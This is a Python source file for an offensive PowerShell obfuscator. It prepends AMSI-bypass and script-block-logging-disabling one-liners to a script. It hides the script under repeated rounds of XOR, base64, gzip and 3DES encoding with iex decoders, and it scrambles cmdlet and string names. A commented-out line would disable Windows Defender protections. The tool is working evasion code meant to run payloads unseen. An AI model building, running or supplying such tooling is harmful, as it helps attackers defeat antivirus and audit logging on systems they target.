#!/usr/bin/env python3.8
import base64
import gzip
import random
import string
import sys
import re
import os
import subprocess
import argparse
import time
from Crypto.Cipher import DES3
    
from clogger import Logger


log = Logger(consolefh=sys.stderr)

DEBUG = False
O_DEBUG = False
O_DEBUG_PATH = './debug_obfu/'

AVAILABLE_STRING_METHODS = []

bypass = [
    """[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)""",
    """[Ref].Assembly.GetType("Management.Automation.Sc"+"riptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
    """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
#    """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
    ]

def get_cmdlets():
    log.info('Getting commandlets')
    ret = ''
    if os.path.exists('/usr/bin/pwsh'):
        log.debug('Found powershell core')
        ret = subprocess.check_output('''/usr/bin/pwsh -C "Get-Command * {$_.CommandType -eq 'Cmdlet'} |  select name -expandproperty name"''', shell=True).decode('utf-8').strip()
    else:
        log.warn('Unable to find powershell core, using builtin list')
        with open('cmdlets.lst','r') as f:
            ret = f.read()
    return list(filter(lambda x:x, ret.split('\n')))

def remove_block_comments(s):
    if type(s) != str:
        s = s.decode('utf-8')
    return dwrite(s)

def wrap_try(s):
    log.debug('Running Wrap Try')
    if type(s) != str:
        s = s.decode('utf-8')
    return 'try{{{0}}}catch{{}}'.format(s)

def build_bypass(l=bypass):
    log.info('Building Bypass')
    return ';'.join(map(wrap_try,l))

def fs_xor(s, k=None):
    log.info('Running Forward Single Char XOR Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ]).encode('utf-8')
    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))

def rs_xor(s, k=None):
    log.info('Running Reverse Single Char XOR Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ])[::-1].encode('utf-8')
    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=$a.Length;$i--;){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))

def fm_xor(s, k='', length=None):
    log.info('Running Forward Multi Char XOR Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    if not len(k) or not length:
        length = random.randint(1,99)
        k = ''.join([random.choice(list(string.ascii_letters+string.digits)) for x in range(length)])
    s = ''.join([chr(ord(x) ^ ord(k[i%len(k)])) for i,x in enumerate(s)]).encode('utf-8')
    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));$z=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{1}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor $z[$i%$z.length])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), base64.b64encode(k.encode('utf-8')).decode('utf-8')))

def b64(s):
    log.info('Running Base64 Obfuscation')
    if type(s) != bytes:
        s = s.encode('utf-8')
    return dwrite('iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.lower().format(base64.b64encode(s).decode('utf-8')))

def gz(s):
    log.info('Running GZIP Obfuscation')
    if type(s) != bytes:
        s = s.encode('utf-8')
    s = gzip.compress(s)
    return dwrite('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{0}"));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));'''.lower().format(base64.b64encode(s).decode('utf-8')))


def remove_quotes(s):
    if s[0] in ("'",'"') and s[-1] in ("'",'"'):
        s = s[1:-1]
    if (s[0] in ("@",) and s[-1] in ("@",)) and s[0] in ("'",'"') and s[-1] in ("'",'"'):
        s = s[2:-2]
    return s

def string_obfu_method1(s):
    ret = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in s]))
    return ret

def string_obfu_method2(s):
    ret = "({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in s]))
    return ret

def rand_string_obfu(s,available_methods):
    m = random.choice(available_methods)
    log.debug("{0} Chosen for string".format(m.__name__))
    ret = m(s)
    return ret


def string_obfu(s):
    log.info('Running String Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    f_strings,m_strings,find = [],[],[]

    find.extend(re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE))
    find.extend(re.findall('(".*?")|(\'.*?\')',s))
    if find:
        [[f_strings.append(a) for a in x if len(a)>2] for x in find]
        if f_strings:
            for st in f_strings:
                n = rand_string_obfu(st, AVAILABLE_STRING_METHODS)
                if '$' not in st and list(set(st)) == " ":
                    s = s.replace(st,n,1)
    
    return dwrite(s)

def triple_des(s):
    if type(s) != str:
        s = s.decode('utf-8')
    log.info('Running 3DES Obfuscation')
    key = os.getrandom(16)
    iv = os.getrandom(8)
    des = DES3.new(key, DES3.MODE_CBC, iv)
    s += ' '*(8-(len(s)%8))
    enc = des.encrypt(s)
    dec = DES3.new(key, DES3.MODE_CBC, iv)
    try:
        if dec.decrypt(enc) == s.encode('utf-8'):
            log.debug("Encryption is working fine")
        else:
            log.debug("Strings do no match, no other error")
            raise Exception('Strings do not match')
    except:
        log.error("Encryption is fucked")
        raise Exception('Encryption routine is borked')
    
    key = base64.b64encode(key).decode('utf-8')
    iv = base64.b64encode(iv).decode('utf-8')
    enc_l = len(enc)
    enc = base64.b64encode(enc).decode('utf-8')
    return dwrite('$p=New-Object Security.Cryptography.TripleDESCryptoServiceProvider;$p.Padding=1;$d=$p.CreateDecryptor([Convert]::FromBase64String("{0}"),[Convert]::FromBase64String("{1}"));iex([Text.Encoding]::UTF8.GetString($d.TransformFinalBlock([Convert]::FromBase64String("{2}"),0,{3})))'.format(key,iv,enc,enc_l))

def dwrite(s):
    if O_DEBUG:
        if not os.path.exists(O_DEBUG_PATH):
            os.mkdir(O_DEBUG_PATH)
        with open('/'.join([O_DEBUG_PATH,'DEBUG_OUTPUT_{0}'.format(time.time())]),'w') as f:
            f.write(s)
            f.close()
    return s

funcs = (fs_xor, # Single-Byte XOR
         fm_xor, # Multi-Byte XOR
         rs_xor, # reversed Single-Byte XOR
         b64, # Base64
         gz, # GZIP
         triple_des, # 3DES
         )

def cmdlet_obfu(s):
    log.debug('Running Commandlet obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    for c in sorted(get_cmdlets(), key=len):
        while c in s:
            n = c.strip().lower()
            log.info('Found: {0}'.format(c))
            rand = list(set(n))
            random.shuffle(rand)
            rand = ''.join(rand)
            st = []
            fr = list(["([char]{0})".format(ord(a)) for a in rand])
            list([st.append('{{{0}}}'.format(rand.find(x))) for x in n])
            cmd = "'{0}'-f{1}".format(''.join(st),','.join(fr))
            log.debug(cmd)    
            #print(subprocess.check_output('''/usr/bin/pwsh -C "{0}"'''.format(cmd), shell=True).decode('utf-8').strip())
            cmd = ' &({0}) '.format(cmd)
            log.info('Obfuscated as: "{0}"'.format(cmd))
            s = s.replace(c,cmd,1)
    return s

    

#print(get_cmdlets())


AVAILABLE_STRING_METHODS = [
    string_obfu_method1,
    string_obfu_method2,

]

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-do', '--debug-obfu', help='Enable Obfuscation Debugging', default=False, action="store_true")
    parser.add_argument('-dp', '--debug-obfu-path', help='Obfuscation Debugging Path', default="./debug_obfu/")
    parser.add_argument('-d', '--debug', help='Enable Debug Logging', default=False, action="store_true")
    parser.add_argument('-ng', '--no-gzip', help='No Inital GZIP', default=False, action="store_true")
    parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=2)
    parser.add_argument('file', help='Powershell script to obfuscate, - for stdin')
    args = parser.parse_args()
    
    
    
    if args.debug:
        DEBUG = True
        log.set_level('DEBUG')
        log.debug('Debugging Enabled')
        
    if args.debug_obfu:
        O_DEBUG = True
        log.info('Output Debugging Enabled')
        O_DEBUG_PATH = args.debug_obfu_path
        log.info('Output Debugging Path "{0}"'.format(O_DEBUG_PATH) )
    
    if args.file == '-':
        _file = sys.stdin
    else:
        _file = open(args.file)
    
    
    c = []
    p = _file.read()
    p = cmdlet_obfu(p)
    b = string_obfu(build_bypass())
    p = string_obfu(p)
    #print(p)
    #gzip first makes sure its smaller
    if not args.no_gzip:
        p = gz(p)
    [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
    p = '{0};$x="";{1}'.format(b,p)
    if not args.no_gzip:
        p = gz(p)
    print(p)
    log.info("Rounds ran:")
    for r in c:
        log.info(r)


